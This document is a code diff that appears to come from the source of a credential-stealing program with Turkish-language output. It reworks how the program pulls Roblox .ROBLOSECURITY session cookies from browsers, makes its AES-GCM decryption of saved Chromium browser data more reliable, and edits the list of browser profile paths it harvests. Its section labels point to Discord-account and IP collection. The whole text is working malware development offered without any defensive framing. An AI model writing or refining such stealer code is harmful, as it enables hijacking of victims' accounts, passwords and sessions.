@@ -444,10 +444,9 @@ Public IP infos:
 
         def GetCookie(cookies):
             try:
-                cookie_str = str(cookies)
-                if ".ROBLOSECURITY=" in cookie_str:
-                    cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
-                    return cookie
+                for c in cookies:
+                    if c.name == '.ROBLOSECURITY':
+                        return c.value
                 return None
             except:
                 return None
@@ -626,9 +625,11 @@ Public IP infos:
 
         def DecryptVal(buff, master_key):
             iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            return cipher.decrypt(payload)[:-16].decode()
+            payload = buff[15:-16]
+            tag = buff[-16:]
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt_and_verify(payload, tag)
+            return decrypted.decode()
 
         def GetMasterKey(path):
             if not os.path.exists(path):
@@ -1061,7 +1062,6 @@ Discord Hesabı n°{str(number_discord_account)}:
             ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
             ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
             ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
-            ("Mozilla Firefox",        os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
             ("Safari",                 os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
         ]
 
@@ -1134,11 +1134,6 @@ Discord Hesabı n°{str(number_discord_account)}:
             master_key = GetMasterKey(os.path.join(path, 'Local State'))
             if not master_key:
                 continue
-
-            for profile in profiles:
-                profile_path = os.path.join(path, profile)
-                if not os.path.exists(profile_path):
-                    continue
 
             for profile in profiles:
                 profile_path = os.path.join(path, profile)
